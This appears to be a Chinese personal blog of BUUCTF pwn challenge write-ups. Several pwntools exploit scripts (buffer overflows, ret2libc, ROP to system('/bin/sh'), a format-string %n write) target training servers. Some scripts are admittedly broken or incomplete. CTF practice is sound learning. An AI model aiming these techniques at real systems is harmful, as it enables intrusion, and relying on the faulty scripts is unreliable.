<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/suctf_2018_basic pwn$ checksec 1111</span><br><span class="line">[*] <span class="string">&#x27;/home/llq/阿pwn/BUUCTF-pwn/suctf_2018_basic pwn/1111&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/suctf_2018_basic pwn$ <span class="built_in">chmod</span> +x 1111</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/suctf_2018_basic pwn$ ./1111</span><br><span class="line">aaa</span><br><span class="line">Hi aaa</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/suctf_2018_basic pwn$ ^C</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/suctf_2018_basic pwn$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>地址随机化和NX都开了</p>
<p>丢进ida里面看看</p>
<p>看见了后门好像</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> callThisFun(void)</span><br><span class="line">&#123;</span><br><span class="line">  char *path[<span class="number">4</span>]; // [rsp+0h] [rbp-20h] BYREF</span><br><span class="line"></span><br><span class="line">  path[<span class="number">0</span>] = <span class="string">&quot;/bin/cat&quot;</span>;</span><br><span class="line">  path[<span class="number">1</span>] = <span class="string">&quot;flag.txt&quot;</span>;</span><br><span class="line">  path[<span class="number">2</span>] = 0LL;</span><br><span class="line">  <span class="keyword">return</span> execve(<span class="string">&quot;/bin/cat&quot;</span>, path, 0LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞没发现</p>
<p>还开了随机化，那怎么溢出呢？</p>
<p>操了，relro是意思把got表变为只读，并不是地址随机化</p>
<p>地址随机化是pie</p>
<p>所以说就是正常的后门是这个意思吗？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27950</span>)</span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x120</span>+<span class="number">8</span>)+p64(<span class="number">0x000000000401157</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="cmcc-pwnme1"><a href="#cmcc-pwnme1" class="headerlink" title="cmcc_pwnme1"></a>cmcc_pwnme1</h2><p>2024.8.13</p>
<p>日常检查</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/cmcc_pwnme1$ checksec 1111</span><br><span class="line">[*] <span class="string">&#x27;/home/llq/阿pwn/BUUCTF-pwn/cmcc_pwnme1/1111&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/cmcc_pwnme1$ <span class="built_in">chmod</span> +x 1111</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/cmcc_pwnme1$ ./1111</span><br><span class="line">Welcome</span><br><span class="line">ok...here is a question: <span class="built_in">which</span> fruit <span class="keyword">do</span> you like ?</span><br><span class="line">Please input your choice:</span><br><span class="line">&gt;&gt; 1.Apple </span><br><span class="line">&gt;&gt; 2.Pear </span><br><span class="line">&gt;&gt; 3.Balana</span><br><span class="line">&gt;&gt; 4.Peach </span><br><span class="line">&gt;&gt; 5.All not? Input  the name  ? </span><br><span class="line">&gt;&gt; 6. Exit    </span><br></pre></td></tr></table></figure>

<p>ok。丢进ida里面看看</p>
<p>栈溢出？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27962</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./1111&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input the name of fruit:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0xa4</span>+<span class="number">4</span>)+p64(<span class="number">0x08048677</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>跑不通</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">oh,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw\x86\x0...</span><br><span class="line">[DEBUG] Received 0x3a bytes:</span><br><span class="line">    b<span class="string">&#x27;Yeah, you got it...\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;/home/flag: No such file or directory\n&#x27;</span></span><br><span class="line">Yeah, you got it...</span><br><span class="line">/home/flag: No such file or directory</span><br><span class="line">[DEBUG] Received 0x2b bytes:</span><br><span class="line">    b<span class="string">&#x27;timeout: the monitored command dumped core\n&#x27;</span></span><br><span class="line"><span class="built_in">timeout</span>: the monitored <span class="built_in">command</span> dumped core</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>

<p>肯定没那么简单的拉</p>
<p>是个假后门拉</p>
<p>ret2libc这么做的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27962</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./1111&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack1</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Exit&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input the name of fruit:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xa4</span>+<span class="number">4</span>)+p32(puts_plt)+p32(main)+p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#puts_addr=u32(p.recv(4))</span></span><br><span class="line">puts_addr=u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="comment">#libic</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)     <span class="comment">#计算偏移量#偏移量=程序里的函数地址-libc里的函数地址</span></span><br><span class="line">system_addr=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_addr=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Exit&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input the name of fruit:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xa4</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="wustctf2020-easyfast"><a href="#wustctf2020-easyfast" class="headerlink" title="wustctf2020_easyfast"></a>wustctf2020_easyfast</h2><p>2024.8.13</p>
<p>日常检查</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/wustctf2020_easyfast$ checksec 1111</span><br><span class="line">[*] <span class="string">&#x27;/home/llq/阿pwn/BUUCTF-pwn/wustctf2020_easyfast/1111&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/wustctf2020_easyfast$ <span class="built_in">chmod</span> +x 1111</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/wustctf2020_easyfast$ ./1111</span><br><span class="line">   __  ___    ______   ___    </span><br><span class="line">  /  |/  /__ /_  __/__&lt;  /_ __</span><br><span class="line"> / /|_/ / _ `// / / __/ /\ \ /</span><br><span class="line">/_/  /_/\_,_//_/ /_/ /_//_\_\ </span><br><span class="line"></span><br><span class="line">choice&gt;</span><br><span class="line">a</span><br></pre></td></tr></table></figure>

<p>丢进ida里面看看</p>
<p>emmmmm~怎么说</p>
<p>直接进行栈溢出？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27962</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./1111&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;choice&gt;&#x27;</span>)</span><br><span class="line"><span class="comment">#p.sendline(&#x27;5&#x27;)</span></span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;Please input the name of fruit:&#x27;)</span></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(<span class="number">0x00400896</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h3 id="堆题-6"><a href="#堆题-6" class="headerlink" title="堆题"></a>堆题</h3><p>，我说溢半天不对</p>
<p>☝️🤓</p>
<h2 id="cmcc-pwnme2"><a href="#cmcc-pwnme2" class="headerlink" title="cmcc_pwnme2"></a>cmcc_pwnme2</h2><p>2024.8.13</p>
<p>日常检查</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/cmcc_pwnme2$ checksec 1111</span><br><span class="line">[*] <span class="string">&#x27;/home/llq/阿pwn/BUUCTF-pwn/cmcc_pwnme2/1111&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/cmcc_pwnme2$ <span class="built_in">chmod</span> +x 1111</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/cmcc_pwnme2$ ./1111</span><br><span class="line">Welcome</span><br><span class="line">Please input:</span><br><span class="line">1</span><br><span class="line">Hello, 1</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/cmcc_pwnme2$</span><br></pre></td></tr></table></figure>

<p>看着应该不难</p>
<p>丢进ida里面看看</p>
<p>漏洞是一眼就看见了gets函数</p>
<p>没怎么找到溢出点</p>
<p>wdf</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25820</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwnme2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">exec_string=<span class="number">0x080485cb</span></span><br><span class="line">string=<span class="number">0x0804a060</span></span><br><span class="line">gets=elf.sym[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(gets)+p32(exec_string)+p32(string)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>不到为什么连不上远程</p>
<p>前天BUUCTF的问题应该是</p>
<h2 id="mrctf2020-easy-equation"><a href="#mrctf2020-easy-equation" class="headerlink" title="mrctf2020_easy_equation"></a>mrctf2020_easy_equation</h2><p>2024.8.15</p>
<p>日常检查</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/mrctf2020_easy_equation$ checksec 1111</span><br><span class="line">[*] <span class="string">&#x27;/home/llq/阿pwn/BUUCTF-pwn/mrctf2020_easy_equation/1111&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/mrctf2020_easy_equation$ <span class="built_in">chmod</span> +x 1111</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/mrctf2020_easy_equation$ ./1111</span><br><span class="line">ok</span><br><span class="line">ok</span><br><span class="line">段错误 (核心已转储)</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/mrctf2020_easy_equation$ ^C</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ok</p>
<p>丢进ida里面</p>
<p>进去一眼大开门</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [rsp+Fh] [rbp-1h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x400uLL</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(&amp;s, <span class="number">1023</span>, stdin);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">11</span> * judge * judge + <span class="number">17</span> * judge * judge * judge * judge - <span class="number">13</span> * judge * judge * judge - <span class="number">7</span> * judge == <span class="number">198</span> )</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;exec /bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接溢出呢还是，满足条件呢</p>
<p>直接溢出一下看看</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">remote</span>(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28402</span>)</span><br><span class="line">elf=<span class="built_in">ELF</span>(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#p.recvuntil(<span class="string">&#x27;Please input:\n&#x27;</span>)</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400753</span></span><br><span class="line">bin_sh_addr=<span class="number">0x000000000400774</span></span><br><span class="line">system_addr=<span class="number">0x0004004E0</span></span><br><span class="line">payload=b<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x1</span><span class="number">+8</span>)+<span class="built_in">p64</span>(pop_rdi)+<span class="built_in">p64</span>(bin_sh_addr)+<span class="built_in">p64</span>(system_addr)</span><br><span class="line"></span><br><span class="line">p.<span class="built_in">sendline</span>(payload)</span><br><span class="line"><span class="meta">#p.sendline(<span class="string">&#x27;flag&#x27;</span>)</span></span><br><span class="line">p.<span class="built_in">interactive</span>()</span><br></pre></td></tr></table></figure>

<p>直接ROP就行</p>
<p>emmmm~s的栈空间只有一位</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031516159.png" alt="image-20240815151230464"></p>
<p>怎么说呢？</p>
<p>刚开始没想到是直接ROP</p>
<h3 id="格式化字符串-1"><a href="#格式化字符串-1" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>也能做</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="number">11</span> * judge * judge + <span class="number">17</span> * judge * judge * judge * judge - <span class="number">13</span> * judge * judge * judge - <span class="number">7</span> * judge == <span class="number">198</span> )</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;exec /bin/sh&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>满足条件的话就是judge为2，就可以进行执行了</p>
<p>但是这个2怎么写入是一个问题</p>
<p>虽然说是judge在bss段上。但是怎么写入进去确实应该问题</p>
<p>格式化字符串也是很明显的 </p>
<p>格式化字符串的一道题。首先是找偏移的对吧</p>
<p>还是老办法</p>
<p>%p打印地址</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/mrctf2020_easy_equation$ ./1111</span><br><span class="line">baaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</span><br><span class="line">baaa-0x23e12a1-0xfbad2288-0x23e12e1-(nil)-0x23e12a0-(nil)-0x6200000000000000-0x252d70252d616161-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0xa70252d70252d70-(nil)-(nil)-(nil)-(nil)-(nil)</span><br><span class="line">段错误 (核心已转储)</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/mrctf2020_easy_equation$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看着是不行</p>
<p>看一手wp</p>
<p>他们是用这个填充的</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">0</span>8x 表示以十六进制形式输出一个整数，并且输出的总长度为<span class="number">8</span>位，不足部分用零填充。</span><br></pre></td></tr></table></figure>

<p>aaaaa-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">llq@llq-<span class="keyword">virtual</span>-machine:~/阿pwn/BUUCTF-pwn/mrctf2020_easy_equation$ ./<span class="number">1111</span></span><br><span class="line">aaaaa-%<span class="number">0</span>8x-%<span class="number">0</span>8x-%<span class="number">0</span>8x-%<span class="number">0</span>8x-%<span class="number">0</span>8x-%<span class="number">0</span>8x-%<span class="number">0</span>8x-%<span class="number">0</span>8x-%<span class="number">0</span>8x-%<span class="number">0</span>8x-%<span class="number">0</span>8x-%<span class="number">0</span>8x</span><br><span class="line">aaaaa<span class="number">-014</span>fa2a1-fbad2288<span class="number">-014</span>fa<span class="number">2e2</span><span class="number">-00000000</span><span class="number">-014</span>fa2a0<span class="number">-00000000</span><span class="number">-00000000</span><span class="number">-61616161</span><span class="number">-30252</span>d78<span class="number">-2</span>d783830<span class="number">-3830252</span>d<span class="number">-252</span>d7838</span><br><span class="line">段错误 (核心已转储)</span><br><span class="line">llq@llq-<span class="keyword">virtual</span>-machine:~/阿pwn/BUUCTF-pwn/mrctf2020_easy_equation$ </span><br></pre></td></tr></table></figure>

<p>找到偏移为8</p>
<p>在bss段judge这写入2</p>
<p>进行跳转</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28402</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;Please input:\n&#x27;)</span></span><br><span class="line"><span class="comment">#pop_rdi=0x0000000000400753</span></span><br><span class="line"><span class="comment">#bin_sh_addr=0x000000000400774</span></span><br><span class="line"><span class="comment">#system_addr=0x0004004E0</span></span><br><span class="line">payload=<span class="string">b&#x27;BB%9$naaa&#x27;</span>+p64(pop_rdi)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.sendline(&#x27;flag&#x27;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>









<h2 id="mrctf2020-shellcode-revenge"><a href="#mrctf2020-shellcode-revenge" class="headerlink" title="mrctf2020_shellcode_revenge"></a>mrctf2020_shellcode_revenge</h2><p>2024.8.15</p>
<p>日常检查</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/mrctf2020_shellcode_revenge$ checksec 1111</span><br><span class="line">[*] <span class="string">&#x27;/home/llq/阿pwn/BUUCTF-pwn/mrctf2020_shellcode_revenge/1111&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/mrctf2020_shellcode_revenge$ <span class="built_in">chmod</span> +x 1111</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/mrctf2020_shellcode_revenge$ ./1111</span><br><span class="line">Show me your magic!</span><br><span class="line">ok</span><br><span class="line">I Can<span class="string">&#x27;t Read This!llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/mrctf2020_shellcode_revenge$</span></span><br></pre></td></tr></table></figure>



